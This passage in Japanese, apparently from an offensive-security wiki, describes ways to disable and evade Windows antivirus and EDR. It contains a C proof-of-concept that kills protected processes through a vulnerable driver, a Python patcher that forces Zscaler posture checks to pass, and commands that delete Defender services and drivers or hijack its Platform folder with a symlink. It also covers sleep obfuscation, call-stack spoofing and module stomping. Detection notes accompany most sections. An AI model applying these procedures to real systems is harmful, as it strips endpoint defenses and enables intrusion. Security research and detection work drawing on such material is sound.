   | `0x99000050` | PIDを指定して任意のプロセスを終了する（Defender/EDRサービスの停止に使用） |
   | `0x990000D0` | ディスク上の任意のファイルを削除する |
   | `0x990001D0` | ドライバーをアンロードしてサービスを削除する |

   最小限のC proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **動作する理由**: BYOVD はユーザーモードの保護を完全に迂回します。カーネルで実行されるコードは、PPL/PP、ELAM、その他のハードニング機能に関係なく、*保護された*プロセスを開いたり、終了させたり、カーネルオブジェクトを改ざんしたりできます。

検知 / 緩和策
•  Microsoft の脆弱なドライバーのブロックリスト（`HVCI`、`Smart App Control`）を有効にし、Windows が `AToolsKrnl64.sys` を読み込まないようにします。
•  新しい *カーネル* サービスの作成を監視し、ドライバーが全ユーザーから書き込み可能なディレクトリから読み込まれた場合や、許可リストに存在しない場合にアラートを発します。
•  ユーザーモードのハンドルがカスタムデバイスオブジェクトに対して作成された後に、不審な `DeviceIoControl` 呼び出しが行われていないか監視します。

### オンディスクのバイナリパッチによる Zscaler Client Connector の Posture Checks の迂回

Zscaler の **Client Connector** は、デバイスの posture ルールをローカルで適用し、結果を他のコンポーネントに伝えるために Windows RPC に依存しています。設計上の弱点が 2 つあるため、完全な迂回が可能です。

1. Posture の評価は **完全にクライアント側で**行われます（boolean がサーバーに送信されます）。
2. 内部 RPC エンドポイントは、接続する実行ファイルが Zscaler によって署名されていることだけを検証します（`WinVerifyTrust` を使用）。<sup>[[11]](#references)</sup>

**署名済みのバイナリ 4 つをオンディスクでパッチ**することで、両方の仕組みを無効化できます。

| バイナリ | パッチ対象の元のロジック | 結果 |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 常に `1` を返すため、すべてのチェックが準拠扱いになります |
| `ZSAService.exe` | `WinVerifyTrust` への間接呼び出し | NOP-ed ⇒ 署名のないプロセスを含む、あらゆるプロセスが RPC パイプにバインドできます |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` に置き換えられます |
| `ZSATunnel.exe` | トンネルの整合性チェック | 短絡されます |

最小限の patcher の抜粋:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

元のファイルを置き換えてサービススタックを再起動すると、次の状態になります。

* posture checks が**すべて**緑色（compliant）で表示される。
* 署名のないバイナリや改変されたバイナリが、名前付きパイプの RPC エンドポイント（例: `\\RPC Control\\ZSATrayManager_talk_to_me`）を開ける。
* 侵害されたホストが、Zscaler ポリシーで定義された内部ネットワークに無制限でアクセスできる。

このケーススタディでは、クライアント側だけで行われる信頼判断と単純な署名チェックが、わずかなバイトパッチで回避できることを示します。

## Microsoft Defender `BTR.sys` の信頼された機能の悪用

Defender の **Boot-Time Removal** driver は、従来型 BYOVD の有用な対照例です。`BTR.sys` は、メモリ破壊のバグも IOCTL インターフェースもない、正規の Microsoft 署名付き修復コンポーネントです。管理者アクセスと `SeLoadDriverPrivilege` を取得した後、攻撃者は代わりに非公開の修復トランザクションを偽造し、本来の Ring-0 ファイル／レジストリ操作を実行できます。これは**侵害後の AV/EDR 無効化プリミティブであり、初期アクセスや権限昇格ではありません**。また、目立つサードパーティ製 driver を持ち込むのではなく、標的自身の `MpEngine.dll` にある `BOOTTIMETOOL` resource から driver を抽出できます。<sup>[[36]](#references)</sup>

### ワンショット driver のステージング

Defender は通常、この resource をランダムな `[a-z]{8}.sys` ファイルとして展開し、同様の名前の kernel service を登録します。`DriverEntry` は service の `Args` 値を読み取り、参照先の NTFS ADS を開き、action list を復号して検証し、feedback を書き込みます。実行が成功すると `0xC0000056`（`STATUS_DELETE_PENDING`）を返すため、driver は常駐せずにアンロードされます。偽造した service には、次のような特徴的な値が設定されています。<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist` ストリームには、RC4で暗号化されたblobが1つ含まれています。解析対象のビルドでは固定の256バイトキーが再利用されるため、暗号化は認可の境界にはなりません。有効な平文は、24バイトのグローバルヘッダー（`Magic=0xFEE1DEAD`、`Version=2`、`PayloadOffset=0x10`、ヘッダーCRC、ペイロードから導出されたトランザクションID）に続き、null終端UTF-16フィードバックパスと、任意の数のアイテムで構成されます。各アイテムは16バイトのヘッダー（`DataSize`、`Action`、`HeaderCRC`、`DataCRC`）と、アクション固有のデータで構成され、データの末尾は**必ず4つのNULバイト**になります。各ヘッダー／データ領域は、CRC-32多項式`0xEDB88320`、初期状態`0xFFFFFFFF`、**最終XORなし**（`~CRC32`）で個別に検証されます。CRC状態は領域ごとにリセットされます。<sup>[[36]](#references)[[37]](#references)</sup>

受け付けられるアクションIDによって、以下のカーネルプリミティブが利用できます。<sup>[[36]](#references)[[37]](#references)</sup>

| ID | アイテムデータ | 結果 |
| --- | --- | --- |
| 1 | `[UTF-16 パス]` | ロック中のファイルを含め、ファイルを削除 |
| 2 | `[UTF-16 パス]` | 空のディレクトリを削除 |
| 3 | `[フラグ][ソース][宛先]` | 攻撃者が選択した保護対象パスにファイルを移動。宛先が空の場合は削除 |
| 4 | `[フラグ][キー パス]` | レジストリキーを再帰的に削除 |
| 5 | `[フラグ][キー パス + "\\" + 値]` | レジストリ値を削除 |
| 6 | `[フラグ][型][サイズ][キー パス + "\\" + 値][データ]` | レジストリ値を作成／更新し、不足しているキー パスを作成 |

アクション5と6では、オンワイヤー上のキー／値の区切り文字は**連続する2つのバックスラッシュ**です。一般的な形式のパスでは、正しく分割されません。フィードバックファイルは、ほとんどの部分でリクエストを反映しますが、各アイテムのデータの先頭4バイトは、処理結果の`NTSTATUS`になります。先頭にフラグフィールドがないアクション1と2では、ステータス用の領域を確保するため、BTRはパスを予約済みの末尾4バイトに移動します。<sup>[[36]](#references)</sup>

### `BTR_CLI` のワークフローと早期ブート時の時間帯

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) は一連の処理を実装します。ローカルのDefenderから`BTR.sys`を抽出し、`<random>.sys:changelist`とフィードバックストリームを作成して、連結されたアクションをシリアライズ、チェックサム付与、暗号化します。その後、サービスレジストリキーを直接作成し、`-trigger now`の場合は`NtLoadDriver`を呼び出し、`-trigger boot`の場合はシステム起動時ドライバーとして残します。レジストリを直接ステージングすることで、通常のSCM `CreateServiceW`経由の処理を回避するため、サービスインストールのイベントID 7045は**記録されません**。ブートトリガーで作成した痕跡は、後から`BTR_CLI.exe -cleanup <service_name>`で削除できます。<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0`は使用できません。BTRは、ストレージスタックと`SystemRoot`リンクの準備が整う前に、`DriverEntry`からファイルI/Oを実行するためです。高優先度の`Boot Bus Extender`グループと`Start=1`を組み合わせると、Phase 1で実行されます。この時点ではNTFSは使用可能ですが、多くのシステム起動セキュリティドライバーやユーザーモードのEDRサービスはまだ初期化されていません。`WdFilter`などのブート開始フィルターはすでにロードされている可能性がありますが、BTRは次回の起動前にそのバイナリやサービス構成を削除でき、SCMがサービス実行ファイルを起動する前に削除することもできます。BTRはブート開始評価の後に実行され、有効なMicrosoft署名を持つため、ELAMではこの隙間を埋められません。<sup>[[36]](#references)</sup>

複数のアクションが1つのトランザクション内で実行されます。PoCでは、ハードコードされた`\SystemRoot\Temp\BootClean.log`を対象とするAction 1を先頭に追加します。BTRはこのログを作成した後、自身の削除要求を処理して、アンロード前にログを削除します。これにより証拠を減らせます。また、フィードバックを`<random>.sys:<random>.dat`に保存すれば、ドライバーと両方のストリームをまとめて削除できます。<sup>[[36]](#references)[[37]](#references)</sup>

### 高シグナルの検出相関

署名のみを対象とするルールやMicrosoftの脆弱なドライバーのブロックリストでは、BTRの本来の機能を悪用した攻撃には対処できません。正規のDefender系統と任意のランチャーを区別しつつ、次のような振る舞いの相関を優先してください。<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist`の作成は、BTRのステージングで必ず発生します。同じ`.sys`に付加された`.dat` ADSは特に疑わしいものです。正規のDefenderでは通常、フィードバックは`C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`以下に保存されます。
- **System 7045を伴わないSysmon 12/13:** `Args=...:changelist`と`Group=Boot Bus Extender`を含む`HKLM\SYSTEM\CurrentControlSet\Services\<random>`の直接作成を、対応するSCMインストールイベントがないことと相関させます。
- **Sysmon 6 -> 23:** Defender以外の系統から既知のBTRドライバーがロードされた後、特にセキュリティバイナリが`System`/PID 4によって削除された場合は、これらを相関させます。
- **Sysmon 11 -> 23:** `System`/PID 4による`\SystemRoot\Temp\BootClean.log`の短時間での作成と削除をアラートします。
- `SeLoadDriverPrivilege`の割り当てと有効化を制限・監査します。`cmd.exe`、PowerShell、または不明なプロセスによってセキュリティツールのドライバーがステージングされた場合、Microsoft署名だけでは信頼の根拠として不十分です。

## LOLBINを使用したProtected Process Light（PPL）の悪用によるAV/EDRへの改ざん

Protected Process Light（PPL）は署名者とレベルの階層を適用し、同等以上の保護レベルを持つプロセスだけが互いに改ざんできるようにします。攻撃者の視点では、PPL対応バイナリを正規の方法で起動し、その引数を制御できれば、ロギングなどの無害な機能を、AV/EDRが使用する保護ディレクトリに対する、制約付きのPPLベースの書き込みプリミティブに変えられます。<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

プロセスをPPLとして実行する条件
- 対象のEXE（およびロードされるDLL）は、PPL対応のEKUで署名されている必要があります。
- プロセスは、次のフラグを指定してCreateProcessで作成する必要があります: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`。
- バイナリの署名者に一致する互換性のある保護レベルを要求する必要があります（例: マルウェア対策署名者には`PROTECTION_LEVEL_ANTIMALWARE_LIGHT`、Windows署名者には`PROTECTION_LEVEL_WINDOWS`）。レベルが正しくない場合、作成は失敗します。

PP/PPLとLSASS保護の概要については、こちらも参照してください。

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

ランチャーツール
- オープンソースのヘルパー: CreateProcessAsPPL（保護レベルを選択し、引数を対象のEXEに渡します）:
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- 使用パターン:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- 署名済みのシステムバイナリ `C:\Windows\System32\ClipUp.exe` は自分自身を子プロセスとして起動し、呼び出し元が指定したパスにログファイルを書き込むパラメーターを受け付けます。
- PPL プロセスとして起動すると、PPL の権限でファイルが書き込まれます。
- ClipUp はスペースを含むパスを解析できないため、通常は保護されている場所を指定するには 8.3 短縮パスを使用します。

8.3 短縮パスのヘルパー
- 短い名前を一覧表示する: 各親ディレクトリで `dir /x` を実行します。
- cmd で短縮パスを取得する: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

悪用チェーン（概要）
1) ランチャー（例: CreateProcessAsPPL）を使い、`CREATE_PROTECTED_PROCESS` を指定して PPL 対応の LOLBIN（ClipUp）を起動します。
2) ClipUp のログパス引数を指定し、保護された AV ディレクトリ（例: Defender Platform）にファイルを作成させます。必要に応じて 8.3 短縮名を使用します。
3) AV の実行中に対象バイナリが通常ロックされている場合（例: MsMpEng.exe）、AV の起動前に書き込みが行われるよう、より早く確実に実行される自動起動サービスをインストールして、起動時に書き込みをスケジュールします。Process Monitor（boot logging）で起動順序を検証します。
4) 再起動すると、AV がバイナリをロックする前に PPL の権限で書き込みが行われ、対象ファイルが破損して起動できなくなります。

実行例（安全のためパスは省略／短縮）:

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

注意点と制約
- ClipUp が書き込む内容は配置場所を除いて制御できません。このプリミティブは、正確なコンテンツの注入よりも破損に適しています。
- サービスのインストール／起動にはローカル管理者/SYSTEM 権限が必要で、再起動できる時間帯も必要です。
- タイミングが重要です。対象が開かれていてはいけません。起動時に実行すれば、ファイルロックを回避できます。

検出
- 起動前後に、特に標準外のランチャーを親プロセスとする `ClipUp.exe` の通常とは異なる引数でのプロセス作成。
- 不審なバイナリを自動起動するよう設定された新しいサービス、および Defender/AV より常に先に起動するサービス。Defender の起動失敗に先立つサービスの作成／変更を調査します。
- Defender のバイナリ／Platform ディレクトリに対するファイル整合性監視。保護プロセスフラグを持つプロセスによる予期しないファイルの作成／変更。
- ETW/EDR テレメトリ: `CREATE_PROTECTED_PROCESS` で作成されたプロセスや、AV 以外のバイナリによる異常な PPL レベルの使用を調べます。

緩和策
- WDAC/Code Integrity: PPL として実行できる署名済みバイナリと、その親プロセスを制限し、正規のコンテキスト以外での ClipUp の起動をブロックします。
- サービスの管理: 自動起動サービスの作成／変更を制限し、起動順序の操作を監視します。
- Defender のタンパー保護と早期起動保護が有効であることを確認します。バイナリの破損を示す起動エラーを調査します。
- 環境との互換性がある場合は、セキュリティツールを配置しているボリュームで 8.3 短縮名の生成を無効にすることを検討します（十分にテストしてください）。

## Platform バージョンフォルダーのシンボリックリンク乗っ取りによる Microsoft Defender の改ざん

Windows Defender は、次の場所にあるサブフォルダーを列挙して、実行元の Platform を選択します。
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

辞書順で最も大きいバージョン文字列（例: `4.18.25070.5-0`）を持つサブフォルダーを選択し、そこから Defender サービスプロセスを起動します（サービス／レジストリのパスもそれに応じて更新されます）。この選択では、ディレクトリの再解析ポイント（シンボリックリンクを含む）も信頼されます。管理者はこれを悪用して Defender の参照先を攻撃者が書き込み可能なパスにリダイレクトし、DLL sideloading やサービス妨害を引き起こせます。<sup>[[21]](#references)[[22]](#references)</sup>

前提条件
- ローカル Administrator（Platform フォルダー内にディレクトリ／シンボリックリンクを作成するために必要）
- 再起動、または Defender による Platform の再選択を実行する手段（起動時のサービス再起動）
- 標準搭載ツールのみで実行可能（mklink）

仕組み
- Defender は自身のフォルダーへの書き込みをブロックしますが、Platform の選択ではディレクトリエントリを信頼し、参照先が保護された／信頼されたパスかを検証せずに、辞書順で最も大きいバージョンを選択します。

手順（例）
1) 書き込み可能な現在の Platform フォルダーのクローン（例: `C:\TMP\AV`）を準備します:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 内に、あなたのフォルダーを指す、より高いバージョン番号のディレクトリシンボリックリンクを作成します。
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) トリガーの選択（再起動を推奨）：
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) がリダイレクト先のパスから実行されていることを確認します:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
新しいプロセスパスが `C:\TMP\AV\` 配下にあり、サービス設定/レジストリにもその場所が反映されていることを確認してください。

Post-exploitation options
- DLL sideloading/code execution: Defender がアプリケーションディレクトリから読み込む DLL を配置/置換し、Defender のプロセス内でコードを実行します。上記のセクションを参照してください: [DLL Sideloading & Proxying](#dll-sideloading--proxying)。
- Service kill/denial: バージョンシンボリックリンクを削除すると、次回の起動時に設定済みのパスが解決できず、Defender の起動に失敗します:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> この technique 単独では privilege escalation はできません。admin 権限が必要です。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red team は、Import Address Table (IAT) を hook し、選択した API を攻撃者が制御する position-independent code (PIC) に経由させることで、runtime evasion を C2 implant から標的 module 自体へ移せます。これにより、多くの kit が公開する限られた API（例: CreateProcessA）を超えて evasion を一般化し、同じ保護を BOF や post-exploitation DLL にも適用できます。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

高レベルのアプローチ
- reflective loader を使い、標的 module とともに PIC blob を配置します（先頭に追加するか、同伴させます）。PIC は自己完結型で、position-independent でなければなりません。
- host DLL のロード時に、その IMAGE_IMPORT_DESCRIPTOR を走査し、標的の import（例: CreateProcessA/W、CreateThread、LoadLibraryA/W、VirtualAlloc）の IAT entry を、薄い PIC wrapper を指すように patch します。
- 各 PIC wrapper は、実際の API address に tail-call する前に evasion を実行します。一般的な evasion には次のものがあります。
  - 呼び出し前後の memory mask/unmask（例: beacon 領域の暗号化、RWX→RX、page 名や permission の変更と、呼び出し後の復元）。
  - Call-stack spoofing: benign な stack を構築し、target API へ移行することで、call-stack analysis で想定どおりの frame が解決されるようにします。<sup>[[9]](#references)</sup>
- 互換性のため、Aggressor script（または同等のもの）が Beacon、BOF、post-ex DLL 用に hook 対象の API を登録できる interface を export します。

この場合に IAT hooking を使う理由
- hook した import を使うコードであれば動作し、tool のコードを変更したり、特定の API を Beacon に proxy させたりする必要がありません。
- post-ex DLL に対応します。LoadLibrary* を hook すると module のロード（例: System.Management.Automation.dll、clr.dll）を intercept し、それらの API 呼び出しにも同じ masking/stack evasion を適用できます。
- CreateProcessA/W を wrapper することで、call-stack ベースの検出に対して process-spawning 型の post-ex command を確実に使用できます。

最小限の IAT hook のスケッチ（x64 C/C++ pseudocode）
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
メモ
- relocations/ASLR後、importの初回使用前にパッチを適用します。TitanLdr/AceLdrなどのReflective loaderは、ロードされたモジュールのDllMain内でhookする方法を示しています。
- wrapperは小さく、PIC-safeに保ちます。パッチ適用前に取得した元のIAT値、またはLdrGetProcedureAddressを使って本物のAPIを解決します。
- PICではRW → RXの遷移を使用し、書き込み可能かつ実行可能なページを残さないようにします。

### Call-stack spoofing stub
- Draugr形式のPIC stubは、無害なモジュール内のreturn addressを使って偽のcall chainを構築し、その後、本物のAPIへpivotします。
- これにより、Beacon/BOFから機密性の高いAPIへのcanonical stackを想定する検知を回避できます。
- stack cutting/stack stitching技術と組み合わせ、API prologueの前に想定されるframe内へ移動します。

運用への統合
- reflective loaderをpost-ex DLLの先頭に追加し、DLLのロード時にPICとhookが自動で初期化されるようにします。
- Aggressor scriptを使って対象APIを登録すると、コードを変更せずにBeaconとBOFが同じ回避経路を透過的に利用できます。

検知/DFIRで考慮する点
- IAT integrity: non-image（heap/anon）アドレスを指すentry、import pointerの定期的な検証。
- Stack anomalies: ロード済みimageに属さないreturn address、non-image PICへの急な遷移、一貫性のないRtlUserThreadStartの祖先関係。
- Loader telemetry: プロセス内でのIAT書き込み、import thunkを変更する初期のDllMain activity、ロード時に作成された予期しないRX領域。
- Image-load evasion: LoadLibrary*をhookする場合、メモリマスキングイベントと関連するautomation/clr assemblyの不審なロードを監視します。

関連するbuilding blockと例
- ロード中にIAT patchingを行うReflective loader（例: TitanLdr、AceLdr）
- Memory masking hook（例: simplehook）とstack-cutting PIC（stackcutting）
- PICによるcall-stack spoofing stub（例: Draugr）


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### 常駐PICOによるimport-time IAT hook

Reflective loaderを制御できる場合、`ProcessImports()`の**実行中**にloaderの`GetProcAddress` pointerを、最初にhookを確認するcustom resolverへ置き換えてimportをhookできます:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- transient loader PICが解放された後も存続する**resident PICO**（persistent PIC object）を構築します。
- `setup_hooks()` functionをexportし、loaderのimport resolverを上書きします（例: `funcs.GetProcAddress = _GetProcAddress`）。
- `_GetProcAddress`ではordinal importをスキップし、`__resolve_hook(ror13hash(name))`のようなhashベースのhook lookupを使います。hookがあればそれを返し、なければ本物の`GetProcAddress`に処理を委ねます。
- Crystal Palaceの`addhook "MODULE$Func" "hook"` entryで、link時にhook targetを登録します。hookはresident PICO内にあるため有効なままです。

これにより、ロード後にDLLのcode sectionへpatchを適用せずに、**import-time IAT redirection**が可能になります。

### 対象がPEB-walkingを使う場合にhook可能なimportを強制する

import-time hookが発動するのは、そのfunctionが対象のIATに実際に存在する場合だけです。moduleがPEB-walk + hashでAPIを解決し（import entryがない場合）、loaderの`ProcessImports()`経路に通すには、本物のimportを強制します。

- hashによるexport解決（例: `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`）を、`&WaitForSingleObject`のような直接参照に置き換えます。
- compilerがIAT entryを出力するため、Reflective loaderによるimport解決時にinterceptできます。

### `Sleep()`をpatchしないEkko形式のsleep/idle obfuscation

`Sleep`をpatchする代わりに、implantが実際に使う**wait/IPC primitive**（`WaitForSingleObject(Ex)`、`WaitForMultipleObjects`、`ConnectNamedPipe`）をhookします。長時間のwaitでは、Ekko形式のobfuscation chainでidle中のメモリ内imageを暗号化します:<sup>[[31]](#references)[[27]](#references)</sup>

- `CreateTimerQueueTimer`を使って、細工した`CONTEXT` frameで`NtContinue`を呼び出すcallbackのsequenceをスケジュールします。
- 一般的なchain（x64）: imageを`PAGE_READWRITE`に設定 → `advapi32!SystemFunction032`でmemory全体にわたりRC4暗号化 → blocking waitを実行 → RC4復号 → PE sectionを走査して**sectionごとのpermissionを復元** → 完了を通知。
- `RtlCaptureContext`でtemplateとなる`CONTEXT`を取得し、複数のframeにcloneして、各stepを呼び出すためのregister（`Rip/Rcx/Rdx/R8/R9`）を設定します。

運用上の詳細: 長時間のwaitでは（例: `WAIT_OBJECT_0`）、imageがマスキングされている間にcallerが処理を続けられるよう、“success”を返します。この方法はidle期間中にmoduleをscannerから隠し、典型的な「patch済み`Sleep()`」のsignatureを避けます。

検知のアイデア（telemetryベース）
- `NtContinue`を指す`CreateTimerQueueTimer` callbackの急増。
- 大きく連続したimageサイズのbufferに対する`advapi32!SystemFunction032`の使用。
- 広範囲の`VirtualProtect`実行後に、customなsectionごとのpermission復元が行われる。

### sleep-obfuscation gadgetのruntime CFG登録

CFGが有効なtargetでは、`jmp [rbx]`や`jmp rdi`のようなfunction途中のgadgetへの最初のindirect jumpで、通常、gadgetがmoduleのCFG metadataに存在しないため、`STATUS_STACK_BUFFER_OVERRUN`でprocessがcrashします。hardeningされたprocess内でEkko/Kraken形式のchainを動作させるには:<sup>[[30]](#references)</sup>

- chainで使うすべてのindirect destinationを、`NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)`と`CFG_CALL_TARGET_VALID` entryで登録します。
- ロード済みimage（`ntdll`、`kernel32`、`advapi32`）内のaddressでは、`MEMORY_RANGE_ENTRY`は**image base**から始め、**image全体のサイズ**を範囲に含める必要があります。
- 手動mapされた/PIC/stompされた領域では、代わりに**allocation base**とallocation sizeを使います。
- dispatch gadgetだけでなく、indirectに到達するexport（`NtContinue`、`SystemFunction032`、`VirtualProtect`、`GetThreadContext`、`SetThreadContext`、wait/event syscall）や、indirect targetとなる攻撃者制御下の実行可能sectionも登録します。

これにより、ROP/JOP形式のsleep chainは「CFGが無効なprocessでのみ動作する」状態から、`/guard:cf`でコンパイルされた`explorer.exe`、browser、`svchost.exe`などのendpointでも再利用可能なprimitiveになります。

### sleep中のthread向けCET-safe stack spoofing

`CONTEXT`全体を置き換える方法は検知されやすく、CET Shadow Stackのsystemでは、spoofされた`Rip`がhardware shadow stackと一致する必要があるため問題が起きることがあります。より安全なsleep-maskingパターンは次のとおりです:<sup>[[30]](#references)</sup>

- 同じprocess内の別threadを選び、`NtQueryInformationThread`経由でその`NT_TIB` / TEB stack bound（`StackBase`、`StackLimit`）を読み取ります。
- 現在のthreadの本物のTEB/TIBをbackupします。
- `GetThreadContext`でsleep中の本物のcontextを取得します。
- spoof contextには本物の`Rip`**だけ**をコピーし、spoofされた`Rsp`/stack stateはそのままにします。
- sleep中はspoof threadの`NT_TIB`を現在のTEBにコピーし、stack walkerが正規のstack範囲内でunwindするようにします。
- wait完了後、元のTIBとthread contextを復元します。

これにより、CETと整合するinstruction pointerを維持しつつ、unwindの検証でTEB stack metadataを信頼するEDR stack walkerを欺けます。

### APCベースの代替手段: Kraken Mask

timer-queue dispatchのsignatureが強すぎる場合は、suspended helper threadからqueued APCを使って、同じsleep-encrypt-spoof-restore sequenceを実行できます:<sup>[[27]](#references)</sup>

- entrypointを`NtTestAlert`にしてhelper threadを作成します。
- `NtQueueApcThread`で準備した`CONTEXT` frame/APCをqueueに入れ、`NtAlertResumeThread`で処理します。
- defaultの64 KB thread stackを使い切らないよう、chain stateはhelper stackではなくheapに保存します。
- `NtSignalAndWaitForSingleObject`でstart eventを原子的に通知し、blockします。
- 半端に復元されたstackをscannerに検知される可能性のある競合時間を減らすため、TIB/contextの復元前にmain threadをsuspendします（`NtSuspendThread` → restore → `NtResumeThread`）。

これにより、同じRC4 maskingとstack-spoofingの目的を保ちながら、`CreateTimerQueueTimer` + `NtContinue`のsignatureをhelper-thread/APCのsignatureに置き換えられます。

追加の検知アイデア
- sleep、wait、APC dispatchの直前に行われる`VmCfgCallTargetInformation`を指定した`NtSetInformationVirtualMemory`。
- `WaitForSingleObject(Ex)`、`NtWaitForSingleObject`、`NtSignalAndWaitForSingleObject`、`ConnectNamedPipe`の前後で呼び出される`GetThreadContext`/`SetThreadContext`。
- `NtQueryInformationThread`の後に、現在のthreadのTEB/TIB stack boundへ直接書き込む処理。
- `SystemFunction032`、`VirtualProtect`、section-permission restoration helperに間接的に到達する`NtQueueApcThread`/`NtAlertResumeThread` chain。
- 署名済みmodule内でdispatch pivotとして使われる、短いgadget signature（`FF 23`（`jmp [rbx]`）や`FF E7`（`jmp rdi`）など）の繰り返し使用。


## Precision Module Stomping

Module stompingは、明らかなprivate executable memoryを割り当てたり、新たな使い捨てDLLをロードしたりする代わりに、**target process内ですでにmapされているDLLの`.text` sectionから**payloadを実行します。上書き先には、processがまだ必要とするcode pathを破壊せずにpayloadを収容できる**ロード済みのdisk-backed image**を選びます。<sup>[[1]](#references)[[2]](#references)</sup>

### 信頼性の高いtarget選定

`uxtheme.dll`や`comctl32.dll`などの一般的なmoduleを無計画にstompする方法は不安定です。そのDLLがremote processにロードされていない場合があり、また、code領域が小さすぎるとprocessがcrashします。より信頼性の高い手順は次のとおりです。

1. target processのmoduleを列挙し、すでにロードされているDLLの**名前のみのinclude list**を作成します。
2. 最初にpayloadをbuildし、**正確なbyte size**を記録します。
3. disk上の候補DLLをscanし、PE sectionの**`.text` `Misc_VirtualSize`**とpayload sizeを比較します。file sizeより重要なのは、メモリにmapされた**実行可能sectionのサイズ**を反映するこの値です。
4. **Export Address Table (EAT)**をparseし、stomp開始offsetとしてexportされたfunctionのRVAを選びます。
5. **blast radius**を計算します。payloadが選択したfunctionの範囲を超えると、メモリ上で後続する隣接exportを上書きします。

実環境で使われている典型的なrecon/選定helper:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

運用上の注意点
- `LoadLibrary` によるテレメトリや予期しないイメージ読み込みを避けるため、リモートプロセスですでに **読み込まれている** DLL を優先します。
- 対象アプリケーションでほとんど実行されない export を優先します。そうしないと、スレッド作成の前後に通常のコードパスが stomp されたバイトに到達する可能性があります。
- 大きな implant では、injector のソース内でバッファ全体を正しく表現するため、shellcode の埋め込みを文字列リテラルから **バイト配列／波括弧付き初期化子**に変更する必要があることがよくあります。

検出のアイデア
- 一般的な private RWX/RX allocation ではなく、**イメージに裏付けられた実行可能ページ**（`MEM_IMAGE`、`PAGE_EXECUTE*`）へのリモート書き込み。
- メモリ上の export エントリポイントのバイト列が、ディスク上の backing file と一致しなくなっている。
- 最初のバイトが直近に変更された正規 DLL export 内から実行を開始するリモートスレッド、またはコンテキストの pivot。
- DLL の `.text` ページに対する不審な `VirtualProtect(Ex)` / `WriteProcessMemory` 呼び出しの後にスレッドが作成される。

## Process Parameter Poisoning (P3)

